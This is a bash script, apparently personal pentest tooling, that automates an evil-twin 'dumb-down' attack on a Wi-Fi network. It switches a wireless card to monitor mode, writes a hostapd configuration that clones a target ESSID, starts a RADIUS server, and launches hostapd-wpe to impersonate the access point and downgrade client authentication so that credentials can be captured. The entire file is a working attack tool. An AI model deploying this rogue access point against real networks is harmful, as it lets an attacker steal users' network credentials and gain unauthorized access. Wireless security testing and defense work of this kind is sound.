#! /bin/bash

# available options: help (-h) | interface (-i; mandatory), essid (-essid; mandatory)
usage="
This script will automatize the process to set up and perform a dumb-down attak\n
$0 [-h] | -i wirelessInterface -e APToAttack -b\n
\n
where:\n
\t   -h	print this help\n
\t   -i	the name of the interface to use for the attack. Not monitor mode\n
\t   -e the access point's essid to perform the attack against\n
\t   -b run the program in background. Otherwise, press [Cntl+C] to sto it.\n
"
# path_hostapd="/opt/hostapd-2.6/hostapd/"
path_hostapd="/home/jbelena/tools/hostapd-2.6/hostapd/"
finish=false
bg=false
trap clean SIGINT SIGTERM

function clean {
    #kill the hostapd process
    hostapd_wpe_pid=`ps -C hostapd-wpe -o pid=`
    # echo $hostapd_wpe_pid
    kill $hostapd_wpe_pid
    finish=true
}

if [ "$#" -ne 1 ] && [ "$#" -ne 4 ] && [ "$#" -ne 5 ]; then
    echo "[-] Illegal number of parameters"
    exit 1
fi

while getopts ":h?:i:e:b" opt; do
    case $opt in
	h)
	    echo -e $usage
	    exit 0
	    ;;
	i)
	    interface=$OPTARG
	    ;;
	e)
	    essid=$OPTARG
	    ;;
	b)
	    bg=true
	    ;;
	\?)
	    echo -e $usage
	    exit 1
	esac
done

#check if interface is already in monitor
iw dev $interface info&>/dev/null>/dev/null
if [ $? -eq  237 ]; then
    echo "[-] The specified interface has not been found"
    exit 3
    
else
    iph=`iw dev $interface info | grep type | awk -F " " '{print $2}'`
    if [ $iph = "monitor" ]; then
	echo "[+] The interface is already in monitor mode"
	break;

    else
	airmon-ng start ${interface}>/dev/null&>/dev/null
	# airmon-ng start ${interface}
	if [ "$?" -ne 0 ]; then
	    echo "[-] There was an error setting the card in monitor mode"
	    exit 2

	else
	    echo "[+] The interface was correctly set in monitor mode"
	fi
    fi
fi

monitorInterface=`sudo airmon-ng | awk 'NR==4' | awk -F ' ' '{print $2}'`

#set up the configuration parameters
cp ./config_files/hostapd-base.conf ${path_hostapd}hostapd_dumb_down.conf
echo "interface=$monitorInterface" > ${path_hostapd}hostapd_dumb_down.conf
echo "ssid=$essid" >> ${path_hostapd}hostapd_dumb_down.conf
cat ${path_hostapd}hostapd-base.conf >> ${path_hostapd}hostapd_dumb_down.conf

#start radius
# radiusd>/dev/null
if [ `netstat -panu | grep radiusd | wc -l` -gt 0 ]; then
    echo "[+] The radius service is already running"
else
    radiusd
    if [ $? -eq 0 ]; then
	echo "[+] The radius service is running"
    else
	echo "[-] There was an error deploying the raidus server"
	exit 4
    fi
fi

#start hostapd
${path_hostapd}hostapd-wpe -B ${path_hostapd}hostapd_dumb_down.conf>/dev/null
# ${path_hostapd}hostapd-wpe ${path_hostapd}hostapd_dumb_down.conf
if [ $? -eq 0 ]; then
    echo "[+] The AP $essid was correctly set up"
else
    echo "[-] There was an error setting up the AP"
fi

if ( $bg );then
    #loop until 
    echo 'Hit CTRL+C to finish'
    while :; do if ( $finish );then break; fi; done
    # wait $!
    # echo `ps -C hostapd-wpe -o pid=`
    # clean
    echo "Tutto finnito"
else
    hostapd_pid=`ps -C hostapd-wpe -o pid=`
    echo "This is the hostap process, execute 'sudo kill $hostapd_pid' to stop the AP"
    echo $hostapd_pid
fi
